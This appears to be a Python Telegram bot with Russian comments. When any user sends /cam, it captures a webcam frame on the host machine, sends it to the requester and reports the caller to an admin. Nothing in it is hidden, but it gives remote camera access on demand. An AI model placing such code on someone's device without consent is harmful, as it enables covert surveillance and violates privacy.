import os
import time
import cv2
import telebot
from tempfile import NamedTemporaryFile
from telebot import types

# Инициализация бота
bot = telebot.TeleBot("You TOKEN")

# ID администратора
ADMIN_ID = ID Admin

# Словарь для отслеживания времени последнего сообщения каждого пользователя
last_message_time = {}

# Словарь для хранения временных файлов с последними сделанными фотографиями каждого пользователя
last_photos = {}

# Словарь для отслеживания количества использований команды /cam каждым пользователем
cam_usage_count = {}

# Словарь для отслеживания юзернеймов пользователей
usernames = {}

# Флаг для проверки состояния бота
is_bot_active = True

# Команды для пользователей
user_commands = ['/start', '/status', '/cam', '/help', '/menu']

# Функция для применения фильтра к фотографии
def apply_filter(image):
    # Возвращаем оригинальное изображение без изменений
    return image

# Функция для сохранения фотографии в облачное хранилище
def save_to_cloud(photo):
    # Реализуйте вашу логику сохранения фотографии в облачное хранилище здесь
    # Например, вы можете использовать API сервиса Google Drive или Dropbox
    # и предоставить пользователю ссылку на загрузку
    pass

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Привет! Я бот для съемки и отправки фотографий. Просто отправь мне команду /cam, чтобы сделать фото и получить его. 😊")

@bot.message_handler(commands=['help'])
def send_help(message):
    bot.reply_to(message, "Напиши команду /menu, и выбери, что тебе нужно! 😊")

@bot.message_handler(commands=['cam'])
def take_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    # Проверяем время последнего сообщения пользователя
    if user_id in last_message_time:
        current_time = time.time()
        if current_time - last_message_time[user_id] < 60:
            bot.reply_to(message, "Подождите, перед отправкой нового сообщения должно пройти минута. ⏳")
            return

    # Включаем первую камеру
    cap = cv2.VideoCapture(0)

    # Устанавливаем более высокое разрешение камеры
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)

    # Уменьшаем количество "прогревающих" кадров
    for i in range(20):
        cap.read()

    # Делаем снимок    
    ret, frame = cap.read()

    # Проверяем успешность считывания кадра
    if ret:
        # Применяем фильтр к фотографии
        filtered_frame = apply_filter(frame)

        # Создаем временный файл для сохранения снимка
        with NamedTemporaryFile(delete=False, suffix='.png') as temp_photo:
            # Записываем снимок во временный файл без изменения размера и без сжатия
            cv2.imwrite(temp_photo.name, filtered_frame, [cv2.IMWRITE_PNG_COMPRESSION, 0])

            # Отправляем снимок пользователю
            photo = open(temp_photo.name, 'rb')
            bot.send_photo(message.chat.id, photo)

            # Обновляем время последнего сообщения пользователя
            last_message_time[user_id] = time.time()

            # Сохраняем временный файл с фото для данного пользователя
            last_photos[user_id] = temp_photo.name

            # Увеличиваем счетчик использования команды /cam для данного пользователя
            cam_usage_count[(user_id, username)] = cam_usage_count.get((user_id, username), 0) + 1
            # Сохраняем юзернейм пользователя
            usernames[user_id] = username

            # Сохраняем фото в облачное хранилище
            save_to_cloud(temp_photo.name)

            # Отправляем уведомление администратору
            user_info = f"Команду вызвал: {message.from_user.first_name} (@{username})"
            bot.send_message(ADMIN_ID, user_info)

    else:
        bot.reply_to(message, "Не удалось сделать снимок. Пожалуйста, попробуйте еще раз. ❌")

    # Отключаем камеру
    cap.release()

@bot.message_handler(commands=['menu'])
def show_menu(message):
    if message.from_user.id != ADMIN_ID:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        for command in user_commands:
            markup.add(types.KeyboardButton(command))
        bot.send_message(message.chat.id, "Выберите команду из меню:", reply_markup=markup)
    else:
        bot.reply_to(message, "Эта команда доступна только пользователям. ❌")

@bot.message_handler(commands=['stop'])
def stop_bot(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "Бот остановлен.")
        # Остановка бота
        global is_bot_active
        is_bot_active = False
    else:
        bot.reply_to(message, "У вас нет прав на выполнение этой команды. ❌")

@bot.message_handler(commands=['status'])
def bot_status(message):
    if is_bot_active:
        bot.reply_to(message, "Бот активен.")
    else:
        bot.reply_to(message, "Бот неактивен. ❌")

@bot.message_handler(commands=['panel'])
def show_stats(message):
    if message.from_user.id == ADMIN_ID:
        stats_message = "Статистика использования команды /cam:\n"
        for (user_id, username), count in cam_usage_count.items():
            stats_message += f"@{usernames[user_id]}: {count} раз\n"
        bot.reply_to(message, stats_message)
    else:
        bot.reply_to(message, "У вас нет прав на выполнение этой команды. ❌")

# Запуск бота
bot.polling()
